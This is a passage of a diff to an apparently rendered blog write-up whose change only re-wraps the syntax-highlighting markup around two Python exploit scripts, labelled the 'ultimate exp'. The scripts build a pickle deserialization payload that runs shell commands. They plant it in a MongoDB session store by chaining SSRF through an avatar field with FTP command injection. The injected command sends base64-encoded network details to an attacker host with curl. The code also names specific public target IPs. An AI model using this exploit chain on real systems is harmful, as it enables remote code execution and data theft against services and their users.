-<span class="kn">import</span> <span class="nn">pickle</span>
-<span class="kn">import</span> <span class="nn">os</span>
-
-<span class="k">def</span> <span class="nf">get_pickle</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
-    <span class="k">class</span> <span class="nc">exp</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
-        <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
-            <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="n">cmd</span><span class="p">,))</span>
-    <span class="k">return</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">exp</span><span class="p">())</span>
-
-<span class="k">def</span> <span class="nf">get_mongo</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
-    <span class="n">client</span> <span class="o">=</span> <span class="n">MongoClient</span><span class="p">(</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">27017</span><span class="p">)</span>
-    <span class="n">coll</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">admin</span><span class="o">.</span><span class="n">sessions</span>
-    <span class="k">try</span><span class="p">:</span>
-        <span class="n">coll</span><span class="o">.</span><span class="n">update_one</span><span class="p">(</span>
-            <span class="p">{</span><span class="s1">&#39;id&#39;</span><span class="p">:</span><span class="s1">&#39;session:37386ce1-3fe8-4f1d-91fc-224581c5279f&#39;</span><span class="p">},</span>
-            <span class="p">{</span><span class="s2">&#34;$set&#34;</span><span class="p">:</span> <span class="p">{</span> <span class="s2">&#34;val&#34;</span><span class="p">:</span> <span class="n">get_pickle</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span> <span class="p">}},</span>
-            <span class="n">upsert</span><span class="o">=</span><span class="kc">True</span>
-        <span class="p">)</span>
-    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
-        <span class="k">return</span> <span class="n">e</span><span class="o">.</span><span class="n">message</span>
-
-<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
-    <span class="nb">print</span><span class="p">(</span><span class="n">get_mongo</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">))</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># -*-author-*-: frankli</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pymongo</span> <span class="kn">import</span> <span class="n">MongoClient</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_pickle</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">exp</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="n">cmd</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">exp</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_mongo</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">client</span> <span class="o">=</span> <span class="n">MongoClient</span><span class="p">(</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">27017</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">coll</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">admin</span><span class="o">.</span><span class="n">sessions</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">coll</span><span class="o">.</span><span class="n">update_one</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span><span class="s1">&#39;id&#39;</span><span class="p">:</span><span class="s1">&#39;session:37386ce1-3fe8-4f1d-91fc-224581c5279f&#39;</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span><span class="s2">&#34;$set&#34;</span><span class="p">:</span> <span class="p">{</span> <span class="s2">&#34;val&#34;</span><span class="p">:</span> <span class="n">get_pickle</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span> <span class="p">}},</span>
+</span></span><span class="line"><span class="cl">            <span class="n">upsert</span><span class="o">=</span><span class="kc">True</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">e</span><span class="o">.</span><span class="n">message</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">get_mongo</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>终极版exp</p>
 <div class="highlight"><div class="chroma">
@@ -632,84 +632,84 @@
 </span><span class="lnt">77
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1"># -*-author-*-: frankli</span>
-<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>
-<span class="kn">import</span> <span class="nn">requests</span>
-<span class="kn">import</span> <span class="nn">socket</span>
-<span class="kn">import</span> <span class="nn">string</span>
-<span class="kn">import</span> <span class="nn">random</span>
-<span class="kn">import</span> <span class="nn">threading</span>
-
-<span class="k">def</span> <span class="nf">get_random_id</span><span class="p">():</span>
-    <span class="n">alphabet</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">)</span>
-    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">alphabet</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">)])</span>
-
-<span class="k">def</span> <span class="nf">get_port_cmd</span><span class="p">(</span><span class="n">host</span><span class="p">):</span>
-    <span class="n">host</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="n">host</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
-    <span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">)</span>
-    <span class="k">return</span> <span class="s1">&#39;PORT &#39;</span> <span class="o">+</span> <span class="s1">&#39;,&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">host</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="p">[</span><span class="nb">str</span><span class="p">(</span><span class="n">port</span> <span class="o">//</span> <span class="mi">256</span><span class="p">),</span> <span class="nb">str</span><span class="p">(</span><span class="n">port</span> <span class="o">-</span> <span class="n">port</span> <span class="o">//</span> <span class="mi">256</span> <span class="o">*</span> <span class="mi">256</span><span class="p">)])</span>
-
-<span class="n">a</span> <span class="o">=</span> <span class="s1">&#39;http://52.163.52.206:8088&#39;</span>
-<span class="n">a</span> <span class="o">=</span> <span class="s1">&#39;http://23.98.68.11:8088&#39;</span>
-
-<span class="n">ftpd</span> <span class="o">=</span> <span class="s1">&#39;172.20.0.2:8877&#39;</span>
-<span class="n">redis</span> <span class="o">=</span> <span class="s1">&#39;172.20.0.4:6379&#39;</span>
-<span class="n">mongo</span> <span class="o">=</span> <span class="s1">&#39;172.20.0.5:27017&#39;</span>
-
-<span class="n">bind</span> <span class="o">=</span> <span class="s1">&#39;vps_ip:2334&#39;</span>
-<span class="n">targ</span> <span class="o">=</span> <span class="n">mongo</span>
-
-<span class="kn">from</span> <span class="nn">mongo</span> <span class="kn">import</span> <span class="n">get_mongo</span>
-<span class="n">request</span> <span class="o">=</span> <span class="n">get_mongo</span><span class="p">(</span><span class="s1">&#39;curl vps_ip:1234/ -H &#34;Host: `ip a|base64`&#34;&#39;</span><span class="p">)</span>
-
-<span class="k">def</span> <span class="nf">ssrf</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
-    <span class="n">page</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">a</span> <span class="o">+</span> <span class="s1">&#39;/login&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
-        <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="n">get_random_id</span><span class="p">(),</span>
-        <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="n">get_random_id</span><span class="p">(),</span>
-        <span class="s1">&#39;avatar&#39;</span><span class="p">:</span> <span class="n">url</span><span class="p">,</span>
-        <span class="s1">&#39;submit&#39;</span><span class="p">:</span> <span class="s1">&#39;Go!&#39;</span>
-    <span class="p">})</span><span class="o">.</span><span class="n">text</span>
-    <span class="n">page</span> <span class="o">=</span> <span class="n">page</span><span class="p">[</span><span class="n">page</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;data:image/png;base64,&#39;</span><span class="p">)</span> <span class="o">+</span>
-                <span class="nb">len</span><span class="p">(</span><span class="s1">&#39;data:image/png;base64,&#39;</span><span class="p">):]</span>
-    <span class="n">page</span> <span class="o">=</span> <span class="n">page</span><span class="p">[:</span><span class="n">page</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;&#34;&#39;</span><span class="p">)]</span>
-    <span class="k">try</span><span class="p">:</span>
-        <span class="n">page</span> <span class="o">=</span> <span class="n">b64decode</span><span class="p">(</span><span class="n">page</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
-    <span class="k">except</span><span class="p">:</span>
-        <span class="n">page</span> <span class="o">=</span> <span class="n">b64decode</span><span class="p">(</span><span class="n">page</span><span class="p">)</span>
-    <span class="k">return</span> <span class="n">page</span>
-
-<span class="k">def</span> <span class="nf">inject</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
-    <span class="n">cmd</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
-    <span class="k">return</span> <span class="n">ssrf</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;&#39;&#39;ftp://fan:root</span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s1">@</span><span class="si">{</span><span class="n">ftpd</span><span class="si">}</span><span class="s1">/&#39;&#39;&#39;</span><span class="p">)</span>
-
-<span class="k">def</span> <span class="nf">sendfile</span><span class="p">(</span><span class="n">file</span><span class="p">):</span>
-    <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
-    <span class="n">sock</span><span class="o">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
-    <span class="n">sock</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">bind</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">])))</span>
-    <span class="n">sock</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-    <span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="n">address</span><span class="p">)</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
-    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;accepted&#39;</span><span class="p">,</span> <span class="n">address</span><span class="p">)</span>
-    <span class="n">client</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">file</span><span class="p">)</span>
-    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;sent&#39;</span><span class="p">)</span>
-    <span class="n">client</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-
-<span class="n">thread</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">sendfile</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">request</span><span class="p">,))</span>
-<span class="n">thread</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
-
-<span class="nb">print</span><span class="p">(</span><span class="n">ssrf</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;ftp://fan:root@</span><span class="si">{</span><span class="n">ftpd</span><span class="si">}</span><span class="s1">/&#39;</span><span class="p">))</span>
-
-<span class="n">inject</span><span class="p">([</span><span class="s1">&#39;TYPE I&#39;</span><span class="p">,</span> <span class="n">get_port_cmd</span><span class="p">(</span><span class="n">bind</span><span class="p">),</span> <span class="s1">&#39;STOR frankli&#39;</span><span class="p">])</span>
-<span class="n">thread</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
-<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;uploaded&#39;</span><span class="p">)</span>
-<span class="nb">print</span><span class="p">(</span><span class="n">ssrf</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;ftp://fan:root@</span><span class="si">{</span><span class="n">ftpd</span><span class="si">}</span><span class="s1">/&#39;</span><span class="p">))</span>
-<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;replaying&#39;</span><span class="p">)</span>
-<span class="n">inject</span><span class="p">([</span><span class="s1">&#39;TYPE I&#39;</span><span class="p">,</span> <span class="n">get_port_cmd</span><span class="p">(</span><span class="n">targ</span><span class="p">),</span> <span class="s1">&#39;RETR frankli&#39;</span><span class="p">])</span>
-<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;replayed&#39;</span><span class="p">)</span>
-<span class="nb">print</span><span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;session&#39;</span><span class="p">:</span> <span class="s1">&#39;1eb74496-98b9-4acc-94fb-75ba15ddb803&#39;</span><span class="p">})</span><span class="o">.</span><span class="n">headers</span><span class="p">)</span>
-<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;requested&#39;</span><span class="p">)</span>
-<span class="n">inject</span><span class="p">([</span><span class="s1">&#39;RNFR frankli&#39;</span><span class="p">,</span> <span class="s1">&#39;RNTO trash&#39;</span><span class="p">])</span>
-<span class="nb">print</span><span class="p">(</span><span class="n">ssrf</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;ftp://fan:root@</span><span class="si">{</span><span class="n">ftpd</span><span class="si">}</span><span class="s1">/&#39;</span><span class="p">))</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># -*-author-*-: frankli</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">threading</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_random_id</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">alphabet</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">alphabet</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">)])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_port_cmd</span><span class="p">(</span><span class="n">host</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">host</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="n">host</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;PORT &#39;</span> <span class="o">+</span> <span class="s1">&#39;,&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">host</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="p">[</span><span class="nb">str</span><span class="p">(</span><span class="n">port</span> <span class="o">//</span> <span class="mi">256</span><span class="p">),</span> <span class="nb">str</span><span class="p">(</span><span class="n">port</span> <span class="o">-</span> <span class="n">port</span> <span class="o">//</span> <span class="mi">256</span> <span class="o">*</span> <span class="mi">256</span><span class="p">)])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="s1">&#39;http://52.163.52.206:8088&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="s1">&#39;http://23.98.68.11:8088&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ftpd</span> <span class="o">=</span> <span class="s1">&#39;172.20.0.2:8877&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">redis</span> <span class="o">=</span> <span class="s1">&#39;172.20.0.4:6379&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">mongo</span> <span class="o">=</span> <span class="s1">&#39;172.20.0.5:27017&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">bind</span> <span class="o">=</span> <span class="s1">&#39;vps_ip:2334&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">targ</span> <span class="o">=</span> <span class="n">mongo</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">mongo</span> <span class="kn">import</span> <span class="n">get_mongo</span>
+</span></span><span class="line"><span class="cl"><span class="n">request</span> <span class="o">=</span> <span class="n">get_mongo</span><span class="p">(</span><span class="s1">&#39;curl vps_ip:1234/ -H &#34;Host: `ip a|base64`&#34;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">ssrf</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">page</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">a</span> <span class="o">+</span> <span class="s1">&#39;/login&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="n">get_random_id</span><span class="p">(),</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="n">get_random_id</span><span class="p">(),</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;avatar&#39;</span><span class="p">:</span> <span class="n">url</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;submit&#39;</span><span class="p">:</span> <span class="s1">&#39;Go!&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">})</span><span class="o">.</span><span class="n">text</span>
+</span></span><span class="line"><span class="cl">    <span class="n">page</span> <span class="o">=</span> <span class="n">page</span><span class="p">[</span><span class="n">page</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;data:image/png;base64,&#39;</span><span class="p">)</span> <span class="o">+</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">len</span><span class="p">(</span><span class="s1">&#39;data:image/png;base64,&#39;</span><span class="p">):]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">page</span> <span class="o">=</span> <span class="n">page</span><span class="p">[:</span><span class="n">page</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;&#34;&#39;</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">page</span> <span class="o">=</span> <span class="n">b64decode</span><span class="p">(</span><span class="n">page</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">page</span> <span class="o">=</span> <span class="n">b64decode</span><span class="p">(</span><span class="n">page</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">page</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">inject</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cmd</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ssrf</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;&#39;&#39;ftp://fan:root</span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s1">@</span><span class="si">{</span><span class="n">ftpd</span><span class="si">}</span><span class="s1">/&#39;&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sendfile</span><span class="p">(</span><span class="n">file</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sock</span><span class="o">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sock</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">bind</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">])))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sock</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="n">address</span><span class="p">)</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;accepted&#39;</span><span class="p">,</span> <span class="n">address</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">client</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">file</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;sent&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">client</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">thread</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">sendfile</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">request</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl"><span class="n">thread</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">ssrf</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;ftp://fan:root@</span><span class="si">{</span><span class="n">ftpd</span><span class="si">}</span><span class="s1">/&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">inject</span><span class="p">([</span><span class="s1">&#39;TYPE I&#39;</span><span class="p">,</span> <span class="n">get_port_cmd</span><span class="p">(</span><span class="n">bind</span><span class="p">),</span> <span class="s1">&#39;STOR frankli&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">thread</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;uploaded&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">ssrf</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;ftp://fan:root@</span><span class="si">{</span><span class="n">ftpd</span><span class="si">}</span><span class="s1">/&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;replaying&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">inject</span><span class="p">([</span><span class="s1">&#39;TYPE I&#39;</span><span class="p">,</span> <span class="n">get_port_cmd</span><span class="p">(</span><span class="n">targ</span><span class="p">),</span> <span class="s1">&#39;RETR frankli&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;replayed&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;session&#39;</span><span class="p">:</span> <span class="s1">&#39;1eb74496-98b9-4acc-94fb-75ba15ddb803&#39;</span><span class="p">})</span><span class="o">.</span><span class="n">headers</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;requested&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">inject</span><span class="p">([</span><span class="s1">&#39;RNFR frankli&#39;</span><span class="p">,</span> <span class="s1">&#39;RNTO trash&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">ssrf</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;ftp://fan:root@</span><span class="si">{</span><span class="n">ftpd</span><span class="si">}</span><span class="s1">/&#39;</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
